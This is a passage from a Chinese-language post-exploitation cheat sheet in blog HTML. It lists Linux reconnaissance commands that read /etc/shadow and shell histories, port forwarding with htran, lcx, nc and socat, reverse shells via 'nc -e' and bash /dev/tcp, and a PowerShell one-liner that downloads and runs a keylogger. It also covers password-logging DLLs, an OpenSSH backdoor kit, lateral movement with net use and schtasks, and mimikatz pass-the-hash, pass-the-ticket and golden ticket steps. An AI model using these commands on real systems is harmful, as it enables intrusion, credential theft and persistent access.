class="keyword">opt</span>/lampp/etc/httpd.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>

<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"><span class="number">1</span>s -alh <span class="meta-keyword">/var/</span>spool/cron</span><br><span class="line"><span class="number">1</span>s -al <span class="meta-keyword">/etc/</span> | grep cron</span><br><span class="line"><span class="number">1</span>s -al <span class="meta-keyword">/etc/</span>cron*</span><br><span class="line">cat <span class="meta-keyword">/etc/</span>cron*</span><br><span class="line">cat <span class="meta-keyword">/etc/</span>at.allow </span><br><span class="line">cat <span class="meta-keyword">/etc/</span>at.deny</span><br><span class="line">cat <span class="meta-keyword">/etc/</span>cron.allow </span><br><span class="line">cat <span class="meta-keyword">/etc/</span>cron.deny </span><br><span class="line">cat <span class="meta-keyword">/etc/</span>crontab </span><br><span class="line">cat <span class="meta-keyword">/etc/</span>anacrontab </span><br><span class="line">cat <span class="meta-keyword">/var/</span>spool<span class="meta-keyword">/cron/</span>crontabs/root</span><br></pre></td></tr></table></figure>

<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/network/interfaces </span><br><span class="line">cat /etc/sysconfig<span class="built_in">/network </span></span><br><span class="line">cat /etc/resolv.conf </span><br><span class="line">cat /etc/sysconfig<span class="built_in">/network </span></span><br><span class="line">cat /etc/networks </span><br><span class="line">iptables-L </span><br><span class="line">hostname </span><br><span class="line">dnsdomainname</span><br></pre></td></tr></table></figure>

<h3 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">netstat -antup</span></span><br><span class="line"><span class="attribute">netstat -antpx</span></span><br><span class="line"><span class="attribute">netstat -tulpn</span></span><br><span class="line"><span class="attribute">arp -e</span></span><br><span class="line"><span class="attribute">route</span></span><br></pre></td></tr></table></figure>

<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">who</span><br><span class="line"><span class="built_in">w</span></span><br><span class="line">last</span><br><span class="line"><span class="keyword">cat</span> /etc/sudoers</span><br><span class="line"><span class="keyword">cat</span> /etc/passwd</span><br><span class="line"><span class="keyword">cat</span> /etc/<span class="built_in">group</span></span><br><span class="line"><span class="keyword">cat</span> /etc/shadow</span><br><span class="line"><span class="keyword">cat</span> ~/.bash_history </span><br><span class="line"><span class="keyword">cat</span> ~/.nano_history</span><br><span class="line"><span class="keyword">cat</span> ~/.atftp_history</span><br><span class="line"><span class="keyword">cat</span> ~/.mysql_history </span><br><span class="line"><span class="keyword">cat</span> ~/.php-history</span><br></pre></td></tr></table></figure>

<h3 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/logs/*</span><br><span class="line">/var/log/*</span><br><span class="line">/var/run/utmp</span><br></pre></td></tr></table></figure>

<p>提权suid程序和写入目录</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查找有suid位或sgid位的程序</span></span><br><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-g</span>=s -o -perm <span class="attribute">-u</span>=s -type f 2 &gt;/dev/<span class="literal">null</span></span><br><span class="line">查找能写或进入的目录</span><br><span class="line"><span class="builtin-name">find</span> / -writable -type d 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"><span class="builtin-name">find</span> / -perm -o+w -type d 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"><span class="builtin-name">find</span> / -perm -o+x -type d 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>主动扫描</span><br><span class="line">nmap,netdiscover,ping等</span><br><span class="line"><span class="number">2.</span>被动嗅探本机流量(arp,smb,netbios)等</span><br><span class="line"><span class="number">3.</span>本机残留信息</span><br></pre></td></tr></table></figure>

<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>在数据包用过网关(路由或防火墙)时,可将通信请求从一个地址和端口号组合重定向到另一个地址.</p>
<h3 id="端口转发类型"><a href="#端口转发类型" class="headerlink" title="端口转发类型"></a>端口转发类型</h3><p>●本地端口转发</p>
<p>●远程端口转发</p>
<p>●动态端口转发</p>
<h3 id="Windows下跨边界应用"><a href="#Windows下跨边界应用" class="headerlink" title="Windows下跨边界应用"></a>Windows下跨边界应用</h3><h4 id="Htran"><a href="#Htran" class="headerlink" title="Htran"></a>Htran</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#正向端口转发</span><br><span class="line">	服务端 <span class="selector-tag">htran</span><span class="selector-class">.exe</span> <span class="selector-tag">-tran</span> 8888 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.1</span> 3389</span><br><span class="line">	客户端 <span class="selector-tag">nc</span> 服务端<span class="selector-tag">IP</span><span class="selector-pseudo">:8888</span></span><br><span class="line">#反向端口转发</span><br><span class="line">	攻击机 <span class="selector-tag">htran</span><span class="selector-class">.exe</span> <span class="selector-tag">-listen</span> 1234 8888</span><br><span class="line">	服务端 <span class="selector-tag">htran</span><span class="selector-class">.exe</span> <span class="selector-tag">-slave</span> 攻击<span class="selector-tag">IP</span> 1234 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span> 3389</span><br><span class="line">	客户机 <span class="selector-tag">nc</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:8888</span></span><br></pre></td></tr></table></figure>

<h4 id="Lcx"><a href="#Lcx" class="headerlink" title="Lcx"></a>Lcx</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#监听<span class="number">1234</span>,转发到<span class="number">2333</span>端口</span><br><span class="line">lcx.exe -<span class="section">listen</span> <span class="number">1234</span> <span class="number">2333</span></span><br><span class="line">#将目标<span class="number">3389</span>转发到本地<span class="number">1234</span></span><br><span class="line">lcx.exe -slave ip <span class="number">1234</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure>

<h4 id="Netsh"><a href="#Netsh" class="headerlink" title="Netsh"></a>Netsh</h4><h4 id="Fpipe"><a href="#Fpipe" class="headerlink" title="Fpipe"></a>Fpipe</h4><h4 id="Socks代理"><a href="#Socks代理" class="headerlink" title="Socks代理"></a>Socks代理</h4><h5 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h5><h5 id="ssocks"><a href="#ssocks" class="headerlink" title="ssocks"></a>ssocks</h5><h3 id="Linux下跨边界应用"><a href="#Linux下跨边界应用" class="headerlink" title="Linux下跨边界应用"></a>Linux下跨边界应用</h3><h4 id="rtcp-py"><a href="#rtcp-py" class="headerlink" title="rtcp.py"></a>rtcp.py</h4><p><a href="https://github.com/knownsec/rtcp" target="_blank" rel="noopener">https://github.com/knownsec/rtcp</a></p>
<h4 id="SSH-PUTTY"><a href="#SSH-PUTTY" class="headerlink" title="SSH + PUTTY"></a>SSH + PUTTY</h4><h4 id="netcat与socat端口转发"><a href="#netcat与socat端口转发" class="headerlink" title="netcat与socat端口转发"></a>netcat与socat端口转发</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netcat:</span><br><span class="line">转发本地8888端口到192.168.1.1的80端口</span><br><span class="line">mkfifo p</span><br><span class="line">cat p | nc 192.168.17.143 80 | nc -l 8888 &gt; p</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socat:</span><br><span class="line">转发本地的1080端口到远程的8080端口(守护进程)</span><br><span class="line">Nohup socat TCP4-LISTEN:1080,reuseaddr,fork</span><br><span class="line">TCP4:192.168.1.1:8080</span><br></pre></td></tr></table></figure>

<h3 id="Earthworm-跨平台内网穿透"><a href="#Earthworm-跨平台内网穿透" class="headerlink" title="Earthworm:跨平台内网穿透"></a>Earthworm:跨平台内网穿透</h3><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">操作机</span></span><br><span class="line">nc.exe -nvv -lp 4444</span><br><span class="line"><span class="meta">#</span><span class="bash">Windiw</span></span><br><span class="line">nc.exe -e cmd IP 4444</span><br><span class="line"><span class="meta">#</span><span class="bash">Linux</span></span><br><span class="line">nc -e /bin/bash IP 4444</span><br></pre></td></tr></table></figure>

<h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h4 id="python-Perl-Php反弹"><a href="#python-Perl-Php反弹" class="headerlink" title="python/Perl/Php反弹"></a>python/Perl/Php反弹</h4><h2 id="密码记录与欺骗攻击"><a href="#密码记录与欺骗攻击" class="headerlink" title="密码记录与欺骗攻击"></a>密码记录与欺骗攻击</h2><h3 id="密码记录工具"><a href="#密码记录工具" class="headerlink" title="密码记录工具"></a>密码记录工具</h3><h4 id="Winlogonhack"><a href="#Winlogonhack" class="headerlink" title="Winlogonhack"></a>Winlogonhack</h4><p>通过hook相关函数来记录登录密码</p>
<h4 id="Ntpass"><a href="#Ntpass" class="headerlink" title="Ntpass"></a>Ntpass</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安装:	rundll32 NTPass.dll,Install</span><br><span class="line">移除: rundll32 NTPass.dll,Remove</span><br><span class="line">口令保存位置: %systemroot%\system32\eulagold.txt</span><br></pre></td></tr></table></figure>

<h4 id="Get-Keystrokes-ps1"><a href="#Get-Keystrokes-ps1" class="headerlink" title="Get-Keystrokes.ps1"></a>Get-Keystrokes.ps1</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1’); Get-Keystrokes –Logpath C:\log.txt</span><br></pre></td></tr></table></figure>

<h4 id="Invoke-CredentialsPhish-ps1"><a href="#Invoke-CredentialsPhish-ps1" class="headerlink" title="Invoke-CredentialsPhish.ps1"></a>Invoke-CredentialsPhish.ps1</h4><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1</a></p>
<h4 id="Openssh后门"><a href="#Openssh后门" class="headerlink" title="Openssh后门"></a>Openssh后门</h4><p>概念:OpenSSH是SSH协议的免费开源实现.</p>
<h4 id="Openssh-backdoor-kit"><a href="#Openssh-backdoor-kit" class="headerlink" title="Openssh-backdoor-kit"></a>Openssh-backdoor-kit</h4><p><a href="https://github.com/jivoi/openssh-backdoor-kit" target="_blank" rel="noopener">https://github.com/jivoi/openssh-backdoor-kit</a></p>
<p>留后门</p>
<h4 id="linux键盘记录sh2log"><a href="#linux键盘记录sh2log" class="headerlink" title="linux键盘记录sh2log"></a>linux键盘记录sh2log</h4><h3 id="ARP与DNS欺骗攻击"><a href="#ARP与DNS欺骗攻击" class="headerlink" title="ARP与DNS欺骗攻击"></a>ARP与DNS欺骗攻击</h3><h4 id="arp欺骗攻击"><a href="#arp欺骗攻击" class="headerlink" title="arp欺骗攻击"></a>arp欺骗攻击</h4><h5 id="Cain"><a href="#Cain" class="headerlink" title="Cain"></a>Cain</h5><h5 id="Abel"><a href="#Abel" class="headerlink" title="Abel"></a>Abel</h5><h4 id="DNS欺骗攻击"><a href="#DNS欺骗攻击" class="headerlink" title="DNS欺骗攻击"></a>DNS欺骗攻击</h4><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h4 id="SMB协议利用"><a href="#SMB协议利用" class="headerlink" title="SMB协议利用"></a>SMB协议利用</h4><p>SMB(服务器消息块)网络文件共享系统</p>
<p>msf扫描:    auxiliary/scanner/smb/smb_login</p>
<h5 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h5><h4 id="跨平台横向移动-wmi利用"><a href="#跨平台横向移动-wmi利用" class="headerlink" title="跨平台横向移动 [ wmi利用 ]"></a>跨平台横向移动 [ wmi利用 ]</h4><p><a href="https://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ</a></p>
<ul>
<li>wmi是什么 ?</li>
<li>想成功利用wmi进行横向移动的前提条件又是什么 ?</li>
<li>如何利用win自带的wmic工具纯手工对目标windows机器进行各种远程操作</li>
<li>关于wmi在powershell下的一些常规应用</li>
<li>如何借助各种外部wmi工具更方便的实现远程执行及半交互式shell获取</li>
<li>基于wmi的跨平台横向移动</li>
<li>关于CobaltStrike以及msf自带的wmi横向功能模块利用</li>
</ul>
<h4 id="计划任务利用"><a href="#计划任务利用" class="headerlink" title="计划任务利用"></a>计划任务利用</h4><h5 id="ipc"><a href="#ipc" class="headerlink" title="ipc"></a>ipc</h5><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use <span class="symbol">\\</span>192.168.111.201<span class="symbol">\I</span>PC$ /user:"administrator" "admin"</span><br><span class="line">copy C:<span class="symbol">\U</span>sers<span class="symbol">\g</span>uanxingzhou<span class="symbol">\D</span>esktop<span class="symbol">\p</span>utty.exe <span class="symbol">\\</span>192.168.111.201<span class="symbol">\c</span>$</span><br></pre></td></tr></table></figure>

<h5 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h5><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks <span class="string">/create</span> <span class="string">/s</span> 192.168.0.70 <span class="string">/u</span> Administrator <span class="string">/p</span> admin <span class="string">/ru</span> <span class="string">"SYSTEM"</span> <span class="string">/tn</span> CMDNAME <span class="string">/sc</span> DAILY <span class="string">/st</span> 22<span class="function">:18</span> <span class="string">/tr</span> C:\\Users\\college\\Desktop\\sha\\cmd.bat <span class="string">/F</span></span><br><span class="line">at</span><br><span class="line">at \\192.168.3.102 19<span class="function">:30</span> <span class="string">/every</span><span class="function">:5</span>,6,7,10,18,19,21,24,28 c:\windows\temp\cmd.bat</span><br></pre></td></tr></table></figure>

<h5 id="at"><a href="#at" class="headerlink" title="at"></a>at</h5><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at <span class="symbol">\\</span>192.168.3.102 19:30 /every:5,6,7,10,18,19,21,24,28 c:<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\c</span>md.bat</span><br></pre></td></tr></table></figure>

<h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><h3 id="Windows认证"><a href="#Windows认证" class="headerlink" title="Windows认证"></a>Windows认证</h3><h4 id="NTLM认证过程"><a href="#NTLM认证过程" class="headerlink" title="NTLM认证过程"></a>NTLM认证过程</h4><h4 id="Kerberos认证过程"><a href="#Kerberos认证过程" class="headerlink" title="Kerberos认证过程"></a>Kerberos认证过程</h4><h3 id="域用户消息"><a href="#域用户消息" class="headerlink" title="域用户消息"></a>域用户消息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看当前用户及sid</span></span><br><span class="line">whoami /user</span><br><span class="line"><span class="comment">#查看用户组</span></span><br><span class="line">whoami /proups</span><br><span class="line"><span class="comment">#查看用户权限</span></span><br><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看域中用户组</span></span><br><span class="line">net group /domain </span><br><span class="line"><span class="comment">#获得域管理员</span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain</span><br><span class="line"><span class="comment">#获得域控制器列表</span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain</span><br><span class="line"><span class="comment">#获得域成员计算机列表</span></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看域中用户</span></span><br><span class="line">net user /domain</span><br><span class="line"><span class="comment">#获得域密码策略设置,密码长短等</span></span><br><span class="line">net accounts /domain</span><br><span class="line"><span class="comment">#列出或断开本机和连接的客户端会话</span></span><br><span class="line">net session</span><br><span class="line"><span class="comment">#查询时间,可用来定位域控</span></span><br><span class="line">net time /domain</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看所有域或工作组</span></span><br><span class="line">net view /domain</span><br><span class="line"><span class="comment">#查看域或工作组下所有在线机器</span></span><br><span class="line">net view /domain:&#123;name&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看共享</span></span><br><span class="line">net share</span><br></pre></td></tr></table></figure>

<h4 id="SRV"><a href="#SRV" class="headerlink" title="SRV"></a>SRV</h4><p>SRV是DNS中的一种资源记录,将服务名称映射到提供DNS服务的计算机名.</p>
<p>利用Nslookup查询SRV</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">type</span>=all</span><br><span class="line"><span class="variable">_ldap</span>.<span class="variable">_tcp</span>.dc.<span class="variable">_msdcs</span>.college.com</span><br></pre></td></tr></table></figure>

<h4 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h4><p>服务主体名称,作用是对服务进行唯一标识.</p>
<h5 id="Setspn-exe"><a href="#Setspn-exe" class="headerlink" title="Setspn.exe"></a>Setspn.exe</h5><p>spn命令行软件</p>
<h4 id="ADFind-exe"><a href="#ADFind-exe" class="headerlink" title="ADFind.exe"></a>ADFind.exe</h4><p>活动目录查询工具</p>
<p>官方文档:</p>
<p><a href="http://www.joeware.net/freetools/tools/adfind/usage.htm" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/adfind/usage.htm</a></p>
<h4 id="PVEFindADUser-exe"><a href="#PVEFindADUser-exe" class="headerlink" title="PVEFindADUser.exe"></a>PVEFindADUser.exe</h4><p>项目地址:</p>
<p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn" target="_blank" rel="noopener">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#显示每台计算机上登录用户</span></span><br><span class="line">PVEFindaduser -current -noping</span><br><span class="line"><span class="comment">#查看172.17.0.132主机上登录的用户</span></span><br><span class="line">PVEFindaduser -current -target <span class="number">172.17</span>.<span class="number">0.132</span></span><br><span class="line"><span class="comment">#查看每台计算机上传登录的用户</span></span><br><span class="line">PVEFindaduser -last</span><br></pre></td></tr></table></figure>

<h4 id="NetView-exe"><a href="#NetView-exe" class="headerlink" title="NetView.exe"></a>NetView.exe</h4><p>收集域内主机共享,ip,是否域控等信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将主机名(或IP地址)列表保存在文件host.txt中</span></span><br><span class="line">netview -f host.txt</span><br></pre></td></tr></table></figure>

<h4 id="Netsess-exe"><a href="#Netsess-exe" class="headerlink" title="Netsess.exe"></a>Netsess.exe</h4><p>列举目标主机上的NetBIOS session</p>
<h4 id="Nltest-exe"><a href="#Nltest-exe" class="headerlink" title="Nltest.exe"></a>Nltest.exe</h4><p>测试域间信任关系</p>
<p>CSVDE&amp;LDIFDE</p>
<p>从ad ds中导入/导出数据.</p>
<p>CSVDE -&gt; csv</p>
<p>LDIFDE -&gt; ldif</p>
<h4 id="ADExplorer-exe"><a href="#ADExplorer-exe" class="headerlink" title="ADExplorer.exe"></a>ADExplorer.exe</h4><p>查看域结构</p>
<h4 id="LASPSearch"><a href="#LASPSearch" class="headerlink" title="LASPSearch"></a>LASPSearch</h4><p>Ldapsearch是linux下ldap客户端</p>
<h4 id="离线凭证收集-1"><a href="#离线凭证收集-1" class="headerlink" title="离线凭证收集"></a>离线凭证收集</h4><p>域用户hash位置:域控上%WINDIR%\ntds\ntds.dit</p>
<ol>
<li><p>ntdsuti提取ntds.dit</p>
</li>
<li><p>使用ntdsdumpex</p>
</li>
</ol>
<h4 id="Powershell利用"><a href="#Powershell利用" class="headerlink" title="Powershell利用"></a>Powershell利用</h4><h5 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h5><p>powershell渗透框架<br><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p>
<h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h5><p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>
<h2 id="域内横向移动"><a href="#域内横向移动" class="headerlink" title="域内横向移动"></a>域内横向移动</h2><h3 id="横向拓展常见漏洞"><a href="#横向拓展常见漏洞" class="headerlink" title="横向拓展常见漏洞"></a>横向拓展常见漏洞</h3><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>MS14-068可以使任意一个普通域用户提升至域管理员权限</p>
<p>利用工具:<a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p>
<h4 id="GPP漏洞"><a href="#GPP漏洞" class="headerlink" title="GPP漏洞"></a>GPP漏洞</h4><p>组策略对象:组策略容器(GPC)和组策略模板(GPT)</p>
<p>组策略模板位置:%systemroot%\sysvol\domainname\Policies{GUID}</p>
<p>当管理员使用(为所有域成员主机添加本地用户)的组策略首选项后,域成员会下载groups.xml文件,里面有新建用户信息,可解密.</p>
<p>利用工具:Get-GPPPassword.</p>
<h4 id="SPN票据破解"><a href="#SPN票据破解" class="headerlink" title="SPN票据破解"></a>SPN票据破解</h4><p>破解方法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RC4加密方式使用tgsrepcrack.py</span><br><span class="line">AES加密方式通过kirbi2john转换为hash,通过john/hashcat破解</span><br></pre></td></tr></table></figure>

<p>SPN扫描</p>
<p>获取破解SPN票据</p>
<p>使用字典进行破解</p>
<h4 id="Mimikatz后渗透中应用"><a href="#Mimikatz后渗透中应用" class="headerlink" title="Mimikatz后渗透中应用"></a>Mimikatz后渗透中应用</h4><h5 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass-The-Hash"></a>Pass-The-Hash</h5><ol>
<li><p>了解NTLM认证过程</p>
</li>
<li><p>使用mimikatz进行hash传递攻击过程</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.本机抓取密码hash</span><br><span class="line">2.使用mimikatz中的sekurlsa::pth命令</span><br><span class="line">3.弹出cmd.尝试查看目标共享</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h5 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看当前用户的ticket</span></span><br><span class="line">Kerberos::list</span><br><span class="line"><span class="meta">#</span><span class="bash">导出当前用户ticket</span></span><br><span class="line">Kerberos::list /export</span><br><span class="line"><span class="meta">#</span><span class="bash">查看所有ticket</span></span><br><span class="line">Sekurlsa::tickets</span><br><span class="line"><span class="meta">#</span><span class="bash">导出所有ticket</span></span><br><span class="line">Sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>

<p>将获取的票据在其他机器导入</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::ptt 票据名</span><br><span class="line">导入票据后用<span class="symbol">:Dir</span>\\DC\c<span class="variable">$ </span>测试</span><br></pre></td></tr></table></figure>

<h5 id="Pass-The-Cache"><a href="#Pass-The-Cache" class="headerlink" title="Pass-The-Cache"></a>Pass-The-Cache</h5><p>获取缓存目录的票据</p>
<h4 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h4><p>能为任意用户生成TGT票据</p>
<p>条件:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 域sid</span><br><span class="line">2. 域名</span><br><span class="line">3. 域账户</span><br><span class="line"></span><br><span class="line">利用上面信息用 mimikatz的kerberos::golden命令生成黄金票据</span><br><span class="line">导入票据</span><br></pre></td></tr></table></figure>

<h4 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h4><p>伪装ST</p>
